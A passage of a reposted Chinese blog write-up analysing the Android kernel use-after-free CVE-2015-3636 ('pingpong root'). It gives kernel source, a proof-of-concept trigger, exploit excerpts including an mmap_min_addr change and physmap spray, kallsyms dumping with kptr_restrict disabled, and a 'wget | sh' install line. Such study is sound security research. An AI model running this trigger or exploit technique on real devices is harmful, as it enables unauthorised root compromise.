-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-CVE-2015-3636" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/14/CVE-2015-3636/">CVE-2015-3636</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/14/CVE-2015-3636/" class="archive-article-date">
-  	<time datetime="2018-08-14T07:35:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="CVE-2015-3636-pingpong-root-android内核-UAF漏洞分析【转】"><a href="#CVE-2015-3636-pingpong-root-android内核-UAF漏洞分析【转】" class="headerlink" title="CVE-2015-3636(pingpong root)android内核 UAF漏洞分析【转】"></a>CVE-2015-3636(pingpong root)android内核 UAF漏洞分析【转】</h3><ul>
-<li>在看雪中随便翻翻，看到CVE-2015-3636，决定跟着复现做一遍~</li>
-<li>网上已有很多分析3636的文章，原理也有很多、本文转自看雪<a href="https://bbs.pediy.com/thread-230298.htm" target="_blank" rel="noopener">原文</a></li>
-</ul>
-<ul>
-<li><p>这个<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back-wp.pdf" target="_blank" rel="noopener">漏洞</a>keen在blackhat上讲过，是一个很经典的android内核漏洞，也是第一个64bit root，还是很有学习价值的。</p>
-</li>
-<li><p>分析android内核的漏洞需要自己下载android源代码和内核源代码，reverse patch，编译调试。吾爱破解有个比赛就是写这个漏洞的exploit，并且还提供了相应的环境。<a href="https://www.52pojie.cn/thread-480759-1-1.html" target="_blank" rel="noopener">吾爱破解2016安全挑战赛</a></p>
-</li>
-<li><p>把内核源代码下载下来看看=</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://aosp.tuna.tsinghua.edu.cn/kernel/common.git</span><br><span class="line">git checkout remotes/origin/android-3.4 -b android-3.4</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>当调用socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP)创建socket再调用connect时，在内核中调用到了inet_dgram_connect</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_dgram_connect</span><span class="params">(struct socket *sock, struct sockaddr * uaddr,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">int</span> addr_len, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (addr_len &lt; <span class="keyword">sizeof</span>(uaddr-&gt;sa_family))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (uaddr-&gt;sa_family == AF_UNSPEC)</span><br><span class="line">        <span class="keyword">return</span> sk-&gt;sk_prot-&gt;disconnect(sk, flags);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!inet_sk(sk)-&gt;inet_num &amp;&amp; inet_autobind(sk))</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    <span class="keyword">return</span> sk-&gt;sk_prot-&gt;connect(sk, (struct sockaddr *)uaddr, addr_len);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(inet_dgram_connect);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果sa_family==AF_UNSPEC会根据协议类型调用相应的disconnect routine，对于PROTO_ICMP来说就是udp_disconnect</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">udp_disconnect</span><span class="params">(struct sock *sk, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span> = <span class="title">inet_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 1003.1g - break association.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"> </span><br><span class="line">    sk-&gt;sk_state = TCP_CLOSE;</span><br><span class="line">    inet-&gt;inet_daddr = <span class="number">0</span>;</span><br><span class="line">    inet-&gt;inet_dport = <span class="number">0</span>;</span><br><span class="line">    sock_rps_reset_rxhash(sk);</span><br><span class="line">    sk-&gt;sk_bound_dev_if = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(sk-&gt;sk_userlocks &amp; SOCK_BINDADDR_LOCK))</span><br><span class="line">        inet_reset_saddr(sk);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!(sk-&gt;sk_userlocks &amp; SOCK_BINDPORT_LOCK)) &#123;</span><br><span class="line">        sk-&gt;sk_prot-&gt;unhash(sk);</span><br><span class="line">        inet-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sk_dst_reset(sk);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(udp_disconnect);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>最终会调用到ping_unhash</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ping_unhash</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">isk</span> = <span class="title">inet_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">    pr_debug(<span class="string">"ping_unhash(isk=%p,isk-&gt;num=%u)\n"</span>, isk, isk-&gt;inet_num);</span><br><span class="line">    <span class="keyword">if</span> (sk_hashed(sk)) &#123;</span><br><span class="line">        write_lock_bh(&amp;ping_table.lock);</span><br><span class="line">        hlist_nulls_del(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">        sk_nulls_node_init(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">        sock_put(sk);</span><br><span class="line">        isk-&gt;inet_num = <span class="number">0</span>;</span><br><span class="line">        isk-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">        sock_prot_inuse_add(sock_net(sk), sk-&gt;sk_prot, <span class="number">-1</span>);</span><br><span class="line">        write_unlock_bh(&amp;ping_table.lock);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(ping_unhash);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果sk_hashed条件成立，则会调用hlist_nulls_del在一个双向链表hlist中删除sk_nulls_node</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __hlist_nulls_del(struct hlist_nulls_node *n)</span><br><span class="line">&#123;</span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span> = <span class="title">n</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> **<span class="title">pprev</span> = <span class="title">n</span>-&gt;<span class="title">pprev</span>;</span></span><br><span class="line">         *pprev = next;</span><br><span class="line">         <span class="keyword">if</span> (!is_a_nulls(next))</span><br><span class="line">                   next-&gt;pprev = pprev;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">hlist_nulls_del</span><span class="params">(struct hlist_nulls_node *n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         __hlist_nulls_del(n);</span><br><span class="line">         n-&gt;pprev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>当n也就是sk_nulls_node被删除之后n-&gt;pprev被设置为LIST_POISON2，值是固定的0x200200。</p>
-</li>
-<li><p>看以下第二次connect的时候sk_hashed条件是否成立</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sk_unhashed</span><span class="params">(<span class="keyword">const</span> struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">return</span> hlist_unhashed(&amp;sk-&gt;sk_node);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sk_hashed</span><span class="params">(<span class="keyword">const</span> struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">return</span> !sk_unhashed(sk);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">hlist_unhashed</span><span class="params">(<span class="keyword">const</span> struct hlist_node *h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">return</span> !h-&gt;pprev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以注意到sk_node和sk_nulls_node共用一个union，两者的定义也十分类似。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sk_node            __sk_common.skc_node</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sk_nulls_node      __sk_common.skc_nulls_node</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>  <span class="title">skc_node</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> <span class="title">skc_nulls_node</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">next</span>, **<span class="title">pprev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span>, **<span class="title">pprev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>虽然设置的是sk_nulls_node-&gt;pprev判断的是sk_node-&gt;pprev，但实际上相同；</p>
-<p>sk_hashed条件成立，再次删除已经删除的对象，执行*pprev=next时pprev已经是0x200200</p>
-<p>如果这个地址没有映射到用户态就会kernel panic。</p>
-</li>
-<li><p>keen给的POC</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span> = &#123;</span> .sa_family = AF_INET &#125;;</span><br><span class="line"><span class="keyword">int</span> ret = connect(sockfd, &amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> _<span class="title">addr</span> = &#123;</span> .sa_family = AF_UNSPEC &#125;;</span><br><span class="line">ret = connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr));</span><br><span class="line">ret = connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr));</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>poc中第一次AF_INET的connect是为了将sk加入hlist中。</p>
-<ul>
-<li>poc的效果</li>
-</ul>
-<p><img src="/2018/08/14/CVE-2015-3636/1.png" alt="1"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/2.png" alt="2"></p>
-<p><code>Unable to handle kernel paging request at virtual address</code>的地址是0x1360而不是0x200200，可能出题的人在这里修改了一下。</p>
-<p>在IDA里面看看。如果采取自己编译调试的方式是可以加载vmlinux符号文件的，这里我们就只能自己从机器上得到函数地址和名称然后加载到IDA中了。把Image拖到IDA64中，Process type选择ARM Little-endian [ARM]。<img src="/2018/08/14/CVE-2015-3636/3.png" alt="3"></p>
-<p>把ROM start address和Loading address设置为0xFFFFFFC000080000(32位系统就是0xC0008000)。Android 8.0中才为4.4及以后的内核引入了KASLR，很显然我们这里没有KASLR，这个值是固定的。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/4.png" alt="4"></p>
-<p>且选择64bit。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/5.png" alt="5"></p>
-<p>在这个时候用IDA是什么也识别不出来的，因为Image文件并不是一个ELF，用binwalk看一下就会发现其实它组成还挺复杂。</p>
-<p>我们接下来从运行的虚拟机中导出内核函数名称和地址。在ubuntu这样的发行版和android内核中有<code>Kernel Address Display Restriction</code>，所以先把它关掉。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">" echo 0 &gt; /proc/sys/kernel/kptr_restrict"</span></span><br><span class="line">cat /proc/kallsyms &gt; /data/<span class="built_in">local</span>/tmp/1.txt</span><br><span class="line">adb pull /data/<span class="built_in">local</span>/tmp/1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/08/14/CVE-2015-3636/6.png" alt="6"></p>
-<p>写一个简答的idc脚本把这些函数名加载到IDA里面。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ksyms = open(<span class="string">"D:\\1.txt"</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> ksyms:</span><br><span class="line">    addr = int(line[<span class="number">0</span>:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">    name = line[<span class="number">19</span>:].replace(<span class="string">'_'</span>,<span class="string">''</span>)</span><br><span class="line">    name = line[<span class="number">19</span>:].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">    idc.MakeCode(addr)</span><br><span class="line">    idc.MakeFunction(addr)</span><br><span class="line">    idc.MakeName(addr,name)</span><br><span class="line">    Message(<span class="string">"%08X:%s"</span>%(addr,name))</span><br></pre></td></tr></table></figure>
-<p>出来的函数列表里面只有ping_hash没有ping_unhash。</p>
-<p>把ping_hash的End address改成0xFFFFFFC000409614。</p>
-<p>再在0xFFFFFFC000409614处create function处理一下就可以了。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/7.png" alt="7"></p>
-<p>可以看到crash处0xFFFFFFC000409644和前后的代码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROM:FFFFFFC00040963C                 LDR             X1, [X19,#0x38]</span><br><span class="line">ROM:FFFFFFC000409640                 LDR             X0, [X19,#0x30]</span><br><span class="line">ROM:FFFFFFC000409644                 STR             X0, [X1]</span><br></pre></td></tr></table></figure>
-<p>这三行代码对应源代码中的下面三行：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> *<span class="title">next</span> = <span class="title">n</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_nulls_node</span> **<span class="title">pprev</span> = <span class="title">n</span>-&gt;<span class="title">pprev</span>;</span></span><br><span class="line">*pprev = next;</span><br></pre></td></tr></table></figure>
-<p>进一步确认了漏洞成因和我们前面所分析的一样。主要参考如下：</p>
-<p><a href="http://www.hhjack.com/arm64_zimage_reverseengineering_with_ida_pro/" target="_blank" rel="noopener">逆向ARM64内核zlmage</a></p>
-<p><a href="https://blog.csdn.net/QQ1084283172/article/details/57074695" target="_blank" rel="noopener">从Android设备中提取内核和逆向分析</a></p>
-<ul>
-<li><p>接下来还是回到正题，既然说这是一个UAF漏洞那么哪里UAF了呢？在<code>hlist_nulls_del</code>之后还有一个<code>sock_put</code>。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ungrab socket and destroy it, if it was the last reference. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sock_put</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (atomic_dec_and_test(&amp;sk-&gt;sk_refcnt))</span><br><span class="line">        sk_free(sk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>sock_put将sk的引用计数减1，并且判断其值是否为0，如果为0的话就free掉sk</li>
-<li>可以想到最后一次connect进入本不该进入的if分支之后如果我们提前mmap了0x200200(这里是0x1360)就不会崩溃，接下来进入sock_put，引用计数变成0，sk被free掉，但是文件描述符还在用户空间，这就造成了UAF。</li>
-</ul>
-</li>
-</ul>
-<h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><p>我们可以先测一下这个EXP。EXP用的github上的：<a href="https://github.com/4B5F5F4B/Exploits/tree/master/Linux/CVE-2015-3636" target="_blank" rel="noopener">EXP</a>。</p>
-<p>不过要注意的是必须用adb shell过去然后su shell才能继承root的权限得到建立socket的权限。测试发现这个EXP确实是可用的，下面就开始调试。<img src="/2018/08/14/CVE-2015-3636/8.png" alt="8"></p>
-<p>调试时的命令如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-aarch64 -cpu cortex-a57 -machine <span class="built_in">type</span>=ranchu -m 1024 -append <span class="string">'console=ttyAMA0,38400 keep_bootcon earlyprintk=ttyAMA0'</span> -serial mon:stdio -kernel Image -initrd /home/hjy/Desktop/android-problem-env/ramdisk.img -drive index=0,id=sdcard,file=/home/hjy/Desktop/android-problem-env/system.img -device virtio-blk-device,drive=sdcard -drive index=1,id=userdata,file=/home/hjy/Desktop/android-problem-env/.//userdata.img -device virtio-blk-device,drive=userdata -drive index=2,id=cache,file=/home/hjy/Desktop/android-problem-env/cache.img -device virtio-blk-device,drive=cache -drive index=3,id=system,file=/home/hjy/Desktop/android-problem-env/system.img -device virtio-blk-device,drive=system -netdev user,id=mynet -device virtio-net-device,netdev=mynet -show-cursor -nographic -L lib/pc-bios -gdb tcp::1234,ipv4 –S</span><br></pre></td></tr></table></figure>
-<p>这里又有一个很坑的地方，用NDK里面的gdb去调试会报Remote ‘g’ packet reply is too long。</p>
-<p>需要自己修改gdb源代码并且编译：参考=<a href="https://blog.csdn.net/bupt073114/article/details/25211319" target="_blank" rel="noopener">重新编译arm-linux-androideabi-gdb和gdbserver：</a></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://android.googlesource.com/toolchain/gdb.git</span><br></pre></td></tr></table></figure>
-<p>下载下来发现有gdb-7.11和gdb-8.0.1两个文件夹，由于pwndbg和GEF等插件目前好像还不支持gdb 8.x，所以我们选择gdb-7.11。</p>
-<p>找到gdb-7.11/gdb目录下的remote.c文件，注释掉这两行。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf_len &gt; <span class="number">2</span> * rsa-&gt;sizeof_g_packet)</span><br><span class="line">   error (_(“Remote ‘g’ packet reply is too <span class="keyword">long</span>: %s”), rs-&gt;buf);</span><br></pre></td></tr></table></figure>
-<p>在后面加上下面这几行：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf_len &gt; <span class="number">2</span> * rsa-&gt;sizeof_g_packet) </span><br><span class="line"> &#123;</span><br><span class="line">    rsa-&gt;sizeof_g_packet = buf_len ;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; gdbarch_num_regs (gdbarch); i++)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">if</span> (rsa-&gt;regs[i].pnum == <span class="number">-1</span>)</span><br><span class="line">       <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">       <span class="keyword">if</span> (rsa-&gt;regs[i].offset &gt;= rsa-&gt;sizeof_g_packet)</span><br><span class="line">       rsa-&gt;regs[i].in_g_packet = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       rsa-&gt;regs[i].in_g_packet = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-<p>编译安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --target=aarch64-linux-androideabi --prefix=/home/hjy/Desktop/gdb_build/gdb/gdb-7.11/arm-linux</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<p>安装GEF，因为很多人说pwndbg比较卡而GEF不卡。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br></pre></td></tr></table></figure>
-<p>开始调试了:</p>
-<p>不过还有一个小坑，我们应该用<code>gef-remote -q localhost:1234</code>也就是加上-q参数不然会报错:<a href="https://github.com/hugsy/gef/issues/124" target="_blank" rel="noopener">原因</a></p>
-<p>进入漏洞利用的部分：</p>
-<p>可以看到在main函数中整个漏洞触发漏洞的过程和POC中一样。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);</span><br><span class="line">ret = connect(vultrig_socks[i], &amp;addr1, <span class="keyword">sizeof</span>(addr1));</span><br><span class="line">system(<span class="string">"echo 4096 &gt; /proc/sys/vm/mmap_min_addr"</span>);</span><br><span class="line"><span class="keyword">void</span>* user_mm = mmap(PAGE_SIZE, MAX_NULLMAP_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">ret = connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br><span class="line">ret = connect(vultrig_socks[i], &amp;addr2, <span class="keyword">sizeof</span>(addr2));</span><br></pre></td></tr></table></figure>
-<p>修改mmap_min_addr并mmap就是为了避免崩溃这样才能执行到sock_put的逻辑。接下来的操作叫做physmap spray，大家如果对<code>CVE-2014-3153(towelroot)</code>还有印象的话，会记得它是通过sendmmsg修改内核数据的，keen在文章中解释了，通过sendmmsg完成堆喷的条件是存在漏洞的对象大小必须和SLAB分配器通常使用的大小一致。而在一些android设备上，PING sock对象的大小是576，不是期望的512或者1024。这样就很难对齐，利用会很不稳定，所以采用的是physmap spray的方法。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/9.png" alt="9"></p>
-<p>在内核中physmap在一个相对较高的地址，而SLAB通常在一个相对较低的地址，通过喷射其它的内核对象使得SLAB分配器在相对高的地址分配PING sock对象造成physmap和SLAB重叠，这个过程叫做<strong><em>lifting</em></strong>。这里的“其它的内核对象”直接用PING sock对象其实就可以。</p>
-<p><img src="/2018/08/14/CVE-2015-3636/10.png" alt="10"></p>
-<p><img src="/2018/08/14/CVE-2015-3636/11.png" alt="11"></p>
-<p>然后释放掉用来做lifting的PING sock对象，和physmap重叠的那一部分则留做触发漏洞。</p>
-<p>那么怎样才能知道什么时候PING sock对象已经被physmap中的数据填充了可以停止喷射以及怎样找到已经被填充的PING sock对象呢？</p>
-<p>在physmap spray中进行了大量的mmap操作，</p>
-<p>并且将<code>mapped_page+0x1D8</code>处赋值为<code>MAGIC_VALUE+physmap_spray_pages_count</code>，</p>
-<p>接下来<code>search_exploitable_socket</code>的时候用ioctl一个一个去试。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(exp_sock, SIOCGSTAMPNS, &amp;time);</span><br></pre></td></tr></table></figure>
-<p>这里的time是timespec结构体，会调用到sock_get_timestampns。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_get_timestampns</span><span class="params">(struct sock *sk, struct timespec __user *userstamp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!sock_flag(sk, SOCK_TIMESTAMP))</span><br><span class="line">        sock_enable_timestamp(sk, SOCK_TIMESTAMP);</span><br><span class="line">    ts = ktime_to_timespec(sk-&gt;sk_stamp);</span><br><span class="line">    <span 